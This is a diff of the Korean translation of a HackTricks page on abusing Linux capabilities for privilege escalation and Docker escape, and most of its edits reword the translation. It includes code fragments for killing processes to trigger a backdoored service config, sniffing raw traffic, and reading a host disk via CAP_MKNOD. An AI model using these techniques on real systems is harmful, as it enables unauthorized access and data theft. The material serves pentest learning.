-그러나 예를 들어 gdb 이진 파일에 CAP\_SYS\_ADMIN 및 CAP\_SYS\_PTRACE 기능을 부여하려고 하면, 이를 부여할 수는 있지만 **이진 파일은 이후에 실행할 수 없다는 것을 알게 될 것입니다**:
+그러나 예를 들어 gdb 이진 파일에 CAP\_SYS\_ADMIN 및 CAP\_SYS\_PTRACE 기능을 부여하려고 하면, 부여할 수는 있지만 **이진 파일은 이후에 실행할 수 없게 됩니다**:
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1313,7 +1313,7 @@ Permitted capabilities는 사용할 수 있는 것들을 제한하는 것처럼 
 
 ## CAP\_SYS\_RAWIO
 
-[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 접근, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` 시스템 호출 접근, 다양한 디스크 명령을 포함한 여러 민감한 작업을 제공합니다. `FIBMAP ioctl(2)`도 이 능력을 통해 활성화되며, 이는 [과거에](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) 문제를 일으킨 바 있습니다. 매뉴얼 페이지에 따르면, 이는 보유자가 다른 장치에서 장치별 작업을 설명적으로 수행할 수 있도록 합니다.
+[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)는 `/dev/mem`, `/dev/kmem` 또는 `/proc/kcore`에 대한 접근, `mmap_min_addr` 수정, `ioperm(2)` 및 `iopl(2)` 시스템 호출 접근, 다양한 디스크 명령을 포함한 여러 민감한 작업을 제공합니다. `FIBMAP ioctl(2)`도 이 능력을 통해 활성화되며, 이는 [과거에](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) 문제를 일으켰습니다. 매뉴얼 페이지에 따르면, 이는 보유자가 다른 장치에서 장치별 작업을 설명적으로 `수행할 수 있게` 합니다.
 
 이는 **권한 상승** 및 **Docker 탈출**에 유용할 수 있습니다.
 
@@ -1323,7 +1323,7 @@ Permitted capabilities는 사용할 수 있는 것들을 제한하는 것처럼 
 
 **바이너리 예시**
 
-**`python`** 바이너리가 이 능력을 가지고 있다고 가정해 봅시다. 만약 **어떤 서비스나 소켓 구성** (또는 서비스와 관련된 구성 파일) 파일을 수정할 수 있다면, 이를 백도어로 만들고, 그 서비스와 관련된 프로세스를 종료한 후 새로운 구성 파일이 당신의 백도어로 실행되기를 기다릴 수 있습니다.
+**`python`** 바이너리가 이 능력을 가지고 있다고 가정해 보겠습니다. 만약 당신이 **어떤 서비스나 소켓 구성** (또는 서비스와 관련된 구성 파일) 파일을 수정할 수 있다면, 이를 백도어로 만들고, 그 서비스와 관련된 프로세스를 종료한 다음, 새로운 구성 파일이 당신의 백도어로 실행되기를 기다릴 수 있습니다.
 ```python
 #Use this python code to kill arbitrary processes
 import os
@@ -1352,11 +1352,11 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ## CAP\_NET\_BIND\_SERVICE
 
-**이는 모든 포트(특권 포트 포함)에서 수신 대기할 수 있음을 의미합니다.** 이 기능으로 직접적으로 권한을 상승시킬 수는 없습니다.
+**이는 모든 포트(특권 포트에서도)에서 수신할 수 있음을 의미합니다.** 이 기능으로 직접적으로 권한을 상승시킬 수는 없습니다.
 
 **바이너리 예시**
 
-만약 **`python`**이 이 기능을 가지고 있다면, 모든 포트에서 수신 대기할 수 있으며, 그 포트에서 다른 포트로 연결할 수 있습니다(일부 서비스는 특정 권한 포트에서의 연결을 요구합니다).
+만약 **`python`**이 이 기능을 가지고 있다면, 모든 포트에서 수신할 수 있으며, 그 포트에서 다른 포트로 연결할 수도 있습니다(일부 서비스는 특정 권한 포트에서의 연결을 요구합니다).
 
 {% tabs %}
 {% tab title="Listen" %}
@@ -1384,13 +1384,13 @@ s.connect(('10.10.10.10',500))
 
 ## CAP\_NET\_RAW
 
-[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 권한은 프로세스가 **RAW 및 PACKET 소켓을 생성**할 수 있도록 허용하여 임의의 네트워크 패킷을 생성하고 전송할 수 있게 합니다. 이는 패킷 스푸핑, 트래픽 주입 및 네트워크 접근 제어 우회를 포함한 보안 위험을 초래할 수 있습니다. 악의적인 행위자는 이를 이용해 컨테이너 라우팅에 간섭하거나 호스트 네트워크 보안을 손상시킬 수 있으며, 특히 적절한 방화벽 보호가 없을 경우 더욱 그렇습니다. 또한, **CAP_NET_RAW**는 RAW ICMP 요청을 통한 ping과 같은 작업을 지원하기 위해 권한이 있는 컨테이너에 필수적입니다.
+[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 권한은 프로세스가 **RAW 및 PACKET 소켓을 생성**할 수 있도록 허용하여 임의의 네트워크 패킷을 생성하고 전송할 수 있게 합니다. 이는 패킷 스푸핑, 트래픽 주입 및 네트워크 접근 제어 우회를 포함한 보안 위험을 초래할 수 있습니다. 악의적인 행위자는 이를 이용해 컨테이너 라우팅에 간섭하거나 호스트 네트워크 보안을 위협할 수 있으며, 특히 적절한 방화벽 보호가 없는 경우에 더욱 그렇습니다. 또한, **CAP_NET_RAW**는 RAW ICMP 요청을 통한 ping과 같은 작업을 지원하기 위해 권한이 있는 컨테이너에 필수적입니다.
 
-**이는 트래픽을 스니핑할 수 있음을 의미합니다.** 이 권한으로 직접적으로 권한을 상승시킬 수는 없습니다.
+**이는 트래픽을 스니핑할 수 있음을 의미합니다.** 이 권한으로 직접적으로 권한 상승을 할 수는 없습니다.
 
 **바이너리 예시**
 
-바이너리 **`tcpdump`**가 이 권한을 가지고 있다면, 이를 사용하여 네트워크 정보를 캡처할 수 있습니다.
+바이너리 **`tcpdump`**가 이 권한을 가지고 있다면, 네트워크 정보를 캡처하는 데 사용할 수 있습니다.
 ```bash
 getcap -r / 2>/dev/null
 /usr/sbin/tcpdump = cap_net_raw+ep
@@ -1399,7 +1399,7 @@ getcap -r / 2>/dev/null
 
 **이진 파일 2의 예**
 
-다음 예는 "**lo**" (**localhost**) 인터페이스의 트래픽을 가로채는 데 유용할 수 있는 **`python2`** 코드입니다. 이 코드는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)에서 "_기초: CAP-NET\_BIND + NET\_RAW_" 실험실의 것입니다.
+다음 예는 "**lo**" (**localhost**) 인터페이스의 트래픽을 가로채는 데 유용할 수 있는 **`python2`** 코드입니다. 이 코드는 [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)에서 "_기본 사항: CAP-NET\_BIND + NET\_RAW_" 실험실의 것입니다.
 ```python
 import socket
 import struct
@@ -1445,7 +1445,7 @@ count=count+1
 ```
 ## CAP\_NET\_ADMIN + CAP\_NET\_RAW
 
-[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 권한은 소유자에게 **네트워크 구성 변경**의 권한을 부여합니다. 여기에는 방화벽 설정, 라우팅 테이블, 소켓 권한 및 노출된 네트워크 네임스페이스 내의 네트워크 인터페이스 설정이 포함됩니다. 또한 네트워크 인터페이스에서 **promiscuous mode**를 활성화하여 네임스페이스 간의 패킷 스니핑을 허용합니다.
+[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) 권한은 소유자에게 **네트워크 구성 변경**의 권한을 부여합니다. 여기에는 방화벽 설정, 라우팅 테이블, 소켓 권한 및 노출된 네트워크 네임스페이스 내의 네트워크 인터페이스 설정이 포함됩니다. 또한 네트워크 인터페이스에서 **promiscuous mode**를 활성화하여 네임스페이스 전반에 걸쳐 패킷 스니핑을 허용합니다.
 
 **이진 파일 예시**
 
@@ -1524,19 +1524,19 @@ sudo chattr -i file.txt
 
 이 기능은 장치 파일을 생성할 수 있는 능력이 필요한 프로세스에 필수적이며, 문자 또는 블록 장치를 통해 직접 하드웨어와 상호작용을 촉진합니다.
 
-이는 기본 도커 기능입니다 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
+이는 기본 docker 기능입니다 ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).
 
 이 기능은 다음 조건에서 호스트에서 권한 상승(전체 디스크 읽기)을 허용합니다:
 
-1. 호스트에 대한 초기 접근 권한이 있음 (비특권).
-2. 컨테이너에 대한 초기 접근 권한이 있음 (특권 (EUID 0) 및 유효한 `CAP_MKNOD`).
-3. 호스트와 컨테이너는 동일한 사용자 네임스페이스를 공유해야 합니다.
+1. 호스트에 대한 초기 접근 권한을 가짐 (비권한).
+2. 컨테이너에 대한 초기 접근 권한을 가짐 (권한이 있는 (EUID 0) 및 유효한 `CAP_MKNOD`).
+3. 호스트와 컨테이너는 동일한 사용자 네임스페이스를 공유해야 함.
 
 **컨테이너에서 블록 장치를 생성하고 접근하는 단계:**
 
 1. **호스트에서 표준 사용자로:**
-- `id`로 현재 사용자 ID를 확인합니다, 예: `uid=1000(standarduser)`.
-- 대상 장치를 식별합니다, 예: `/dev/sdb`.
+- `id`로 현재 사용자 ID를 확인, 예: `uid=1000(standarduser)`.
+- 대상 장치를 식별, 예: `/dev/sdb`.
 
 2. **컨테이너 내에서 `root`로:**
 ```bash
@@ -1558,19 +1558,19 @@ ps aux | grep -i container_name | grep -i standarduser
 # Access the container's filesystem and the special block device
 head /proc/12345/root/dev/sdb
 ```
-이 접근 방식은 표준 사용자가 컨테이너를 통해 `/dev/sdb`의 데이터에 접근하고 잠재적으로 읽을 수 있도록 하여 공유 사용자 네임스페이스와 장치에 설정된 권한을 악용합니다.
+이 접근 방식은 표준 사용자가 컨테이너를 통해 `/dev/sdb`에 접근하고 잠재적으로 데이터를 읽을 수 있도록 하여 공유 사용자 네임스페이스와 장치에 설정된 권한을 악용합니다.
 
 ### CAP\_SETPCAP
 
-**CAP_SETPCAP**는 프로세스가 다른 프로세스의 **능력 집합을 변경**할 수 있도록 하여, 유효한, 상속 가능한 및 허용된 집합에서 능력을 추가하거나 제거할 수 있게 합니다. 그러나 프로세스는 자신의 허용된 집합에 있는 능력만 수정할 수 있으므로, 다른 프로세스의 권한을 자신의 권한 이상으로 상승시킬 수 없습니다. 최근 커널 업데이트는 이러한 규칙을 강화하여 `CAP_SETPCAP`가 자신의 허용된 집합이나 자식 프로세스의 허용된 집합 내에서만 능력을 줄일 수 있도록 제한하여 보안 위험을 완화하고자 했습니다. 사용하려면 유효한 집합에 `CAP_SETPCAP`가 있어야 하며, 수정할 대상 능력이 허용된 집합에 있어야 하며, `capset()`을 사용하여 수정합니다. 이는 `CAP_SETPCAP`의 핵심 기능과 제한 사항을 요약하며, 권한 관리 및 보안 강화에서의 역할을 강조합니다.
+**CAP_SETPCAP**는 프로세스가 다른 프로세스의 **능력 집합을 변경**할 수 있도록 하여, 유효, 상속 가능 및 허용된 집합에서 능력을 추가하거나 제거할 수 있게 합니다. 그러나 프로세스는 자신의 허용된 집합에 있는 능력만 수정할 수 있으므로, 다른 프로세스의 권한을 자신의 권한 이상으로 상승시킬 수 없습니다. 최근 커널 업데이트는 이러한 규칙을 강화하여 `CAP_SETPCAP`가 자신의 허용된 집합이나 자식 프로세스의 허용된 집합 내에서만 능력을 줄일 수 있도록 제한하여 보안 위험을 완화하는 것을 목표로 하고 있습니다. 사용하려면 유효 집합에 `CAP_SETPCAP`가 있어야 하며, 수정할 대상 능력이 허용된 집합에 있어야 하며, `capset()`을 사용하여 수정합니다. 이는 `CAP_SETPCAP`의 핵심 기능과 제한 사항을 요약하며, 권한 관리 및 보안 강화에서의 역할을 강조합니다.
 
-**`CAP_SETPCAP`**는 프로세스가 **다른 프로세스의 능력 집합을 수정**할 수 있도록 하는 리눅스 능력입니다. 이는 다른 프로세스의 유효한, 상속 가능한 및 허용된 능력 집합에서 능력을 추가하거나 제거할 수 있는 능력을 부여합니다. 그러나 이 능력을 사용하는 방법에 대한 특정 제한이 있습니다.
+**`CAP_SETPCAP`**는 프로세스가 **다른 프로세스의 능력 집합을 수정**할 수 있도록 하는 리눅스 능력입니다. 이는 다른 프로세스의 유효, 상속 가능 및 허용된 능력 집합에서 능력을 추가하거나 제거할 수 있는 능력을 부여합니다. 그러나 이 능력을 사용하는 방법에 대한 특정 제한이 있습니다.
 
-`CAP_SETPCAP`가 있는 프로세스는 **자신의 허용된 능력 집합에 있는 능력만 부여하거나 제거할 수 있습니다**. 즉, 프로세스가 그 능력을 가지고 있지 않다면 다른 프로세스에 능력을 부여할 수 없습니다. 이 제한은 프로세스가 다른 프로세스의 권한을 자신의 권한 수준 이상으로 상승시키는 것을 방지합니다.
+`CAP_SETPCAP`가 있는 프로세스는 **자신의 허용된 능력 집합에 있는 능력만 부여하거나 제거할 수 있습니다**. 즉, 프로세스가 자신이 가지고 있지 않은 능력을 다른 프로세스에 부여할 수 없습니다. 이 제한은 프로세스가 다른 프로세스의 권한을 자신의 권한 수준 이상으로 상승시키는 것을 방지합니다.
 
-게다가, 최근 커널 버전에서는 `CAP_SETPCAP` 능력이 **더욱 제한되었습니다**. 이제 프로세스가 다른 프로세스의 능력 집합을 임의로 수정할 수 없습니다. 대신, **자신의 허용된 능력 집합이나 자식 프로세스의 허용된 능력 집합에서 능력을 줄이는 것만 허용합니다**. 이 변경은 능력과 관련된 잠재적인 보안 위험을 줄이기 위해 도입되었습니다.
+게다가, 최근 커널 버전에서는 `CAP_SETPCAP` 능력이 **더욱 제한되었습니다**. 이제 프로세스가 다른 프로세스의 능력 집합을 임의로 수정할 수 없게 되었습니다. 대신, **자신의 허용된 능력 집합이나 자식 프로세스의 허용된 능력 집합에서 능력을 줄이는 것만 허용됩니다**. 이 변경은 능력과 관련된 잠재적인 보안 위험을 줄이기 위해 도입되었습니다.
 
-`CAP_SETPCAP`를 효과적으로 사용하려면 유효한 능력 집합에 이 능력이 있어야 하며, 대상 능력이 허용된 능력 집합에 있어야 합니다. 그런 다음 `capset()` 시스템 호출을 사용하여 다른 프로세스의 능력 집합을 수정할 수 있습니다.
+`CAP_SETPCAP`를 효과적으로 사용하려면 유효 능력 집합에 해당 능력이 있어야 하며, 대상 능력이 허용된 능력 집합에 있어야 합니다. 그런 다음 `capset()` 시스템 호출을 사용하여 다른 프로세스의 능력 집합을 수정할 수 있습니다.
 
 요약하자면, `CAP_SETPCAP`는 프로세스가 다른 프로세스의 능력 집합을 수정할 수 있도록 하지만, 자신이 가지고 있지 않은 능력을 부여할 수는 없습니다. 또한 보안 문제로 인해 최근 커널 버전에서는 자신의 허용된 능력 집합이나 자식 프로세스의 허용된 능력 집합에서 능력을 줄이는 것만 허용하도록 기능이 제한되었습니다.
 
@@ -1595,16 +1595,16 @@ head /proc/12345/root/dev/sdb
 
 {% embed url="https://www.rootedcon.com/" %}
 {% hint style="success" %}
-AWS 해킹 배우고 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP 해킹 배우고 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>HackTricks 지원하기</summary>
+<summary>Support HackTricks</summary>
 
-* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
-* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter**에서 **팔로우**하세요** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **해킹 팁을 공유하려면 [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하세요.**
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
